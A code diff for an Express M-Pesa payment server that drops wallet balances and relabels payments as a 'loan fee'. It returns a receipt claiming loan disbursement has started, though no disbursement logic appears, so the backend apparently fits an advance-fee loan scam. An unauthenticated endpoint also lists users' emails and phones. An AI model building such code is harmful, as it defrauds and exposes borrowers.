@@ -19,7 +19,7 @@ app.use(express.static(path.join(__dirname, '.')));
 // ✅ Allow requests from multiple origins for development and production
 app.use(cors({
   origin: [
-    "https://testpay254.netlify.app",
+    "https://funny-tanuki-b344b5.netlify.app",
     "http://localhost:5000",
     "http://0.0.0.0:5000",
     "http://127.0.0.1:5000"
@@ -35,7 +35,6 @@ const PAYMENT_ACCOUNT_ID = process.env.SPAWIKO_ACCOUNT_ID || 17;
 // ========================
 // In-memory stores
 // ========================
-const balances = {}; // { phone: balance }
 const users = {}; // { email: { phone, email } }
 const phoneToEmail = {}; // { phone: email }
 
@@ -43,7 +42,6 @@ const phoneToEmail = {}; // { phone: email }
 function createUser(email, phone) {
   users[email] = { email, phone };
   phoneToEmail[phone] = email;
-  if (!balances[phone]) balances[phone] = 0;
   return users[email];
 }
 
@@ -56,15 +54,21 @@ function getUserByPhone(phone) {
   return email ? users[email] : null;
 }
 
-// Helper functions for balance management
-function creditBalance(phone, amount) {
-  if (!balances[phone]) balances[phone] = 0;
-  balances[phone] += Number(amount);
-  return balances[phone];
-}
-
-function getBalance(phone) {
-  return balances[phone] || 0;
+// ========================
+// Helper: Generate Receipt
+// ========================
+function generateReceipt({ phone, amount, reference, transaction_code, checkout_request_id }) {
+  return {
+    receipt_id: `RCPT_${Date.now()}`,
+    transaction_code: transaction_code || null,
+    reference,
+    phone,
+    amount,
+    currency: "KSh",
+    checkout_request_id,
+    timestamp: new Date().toISOString(),
+    note: "Your loan fee payment is completed, the loan disbursement has started. It may take less than 10 minutes."
+  };
 }
 
 // ========================
@@ -164,7 +168,7 @@ app.post("/stkpush", async (req, res) => {
       phone,
       amount,
       reference,
-      description: "PayFlow Deposit via M-Pesa"
+      description: "Loan Fee Payment via M-Pesa"
     };
 
     const stkResponse = await axios.post(
@@ -207,19 +211,18 @@ app.post("/stkpush", async (req, res) => {
 
       if (statusResult.success) {
         if (statusResult.status === "completed") {
-          // ✅ Credit user balance when payment succeeds
-          creditBalance(phone, amount);
-
-          return res.json({
-            success: true,
-            message: "Payment completed",
-            transaction_code: statusResult.transaction_code,
+          const receipt = generateReceipt({
             phone,
             amount,
             reference,
-            checkout_request_id: checkoutRequestId,
-            status: "completed",
-            balance: getBalance(phone)
+            transaction_code: statusResult.transaction_code,
+            checkout_request_id: checkoutRequestId
+          });
+
+          return res.json({
+            success: true,
+            message: "Loan fee completed",
+            receipt
           });
         } else if (statusResult.status === "failed") {
           return res.json({
@@ -283,15 +286,24 @@ app.post("/transaction/status", async (req, res) => {
 
     if (statusResult.success) {
       if (statusResult.status === "completed" && phone && amount) {
-        creditBalance(phone, amount); // ✅ Update balance if not already credited
+        const receipt = generateReceipt({
+          phone,
+          amount,
+          reference: req.body.reference || null,
+          transaction_code: statusResult.transaction_code,
+          checkout_request_id
+        });
+
+        return res.json({
+          success: true,
+          message: "Loan fee completed",
+          receipt
+        });
       }
 
-      res.json({
+      return res.json({
         success: true,
         status: statusResult.status,
-        transaction_code: statusResult.transaction_code || null,
-        checkout_request_id,
-        balance: phone ? getBalance(phone) : undefined,
         message: `Transaction is ${statusResult.status}`
       });
     } else {
@@ -309,48 +321,13 @@ app.post("/transaction/status", async (req, res) => {
 });
 
 // ========================
-// Balance Check (Real from memory)
-// ========================
-app.post("/balance/check", (req, res) => {
-  try {
-    const { phone } = req.body;
-
-    if (!phone) {
-      return res.status(400).json({ success: false, message: "Phone number is required" });
-    }
-
-    // Validate that user exists
-    const user = getUserByPhone(phone);
-    if (!user) {
-      return res.status(404).json({ success: false, message: "User not found" });
-    }
-
-    const balance = getBalance(phone);
-
-    res.json({
-      success: true,
-      balance,
-      currency: "KSh",
-      phone,
-      timestamp: new Date().toISOString(),
-      message: "Balance retrieved successfully"
-    });
-
-  } catch (err) {
-    console.error("Balance Check Error:", err.message);
-    res.status(500).json({ success: false, message: "Internal server error" });
-  }
-});
-
-// ========================
 // Get All Users (for admin purposes)
 // ========================
 app.get("/api/users", (req, res) => {
   try {
     const userList = Object.values(users).map(user => ({
       email: user.email,
-      phone: user.phone,
-      balance: getBalance(user.phone)
+      phone: user.phone
     }));
     
     res.json({ 
@@ -373,8 +350,7 @@ app.get("/health", (req, res) => {
     success: true, 
     message: "PayFlow Server is running", 
     timestamp: new Date().toISOString(),
-    totalUsers: Object.keys(users).length,
-    totalBalance: Object.values(balances).reduce((sum, bal) => sum + bal, 0)
+    totalUsers: Object.keys(users).length
   });
 });
 
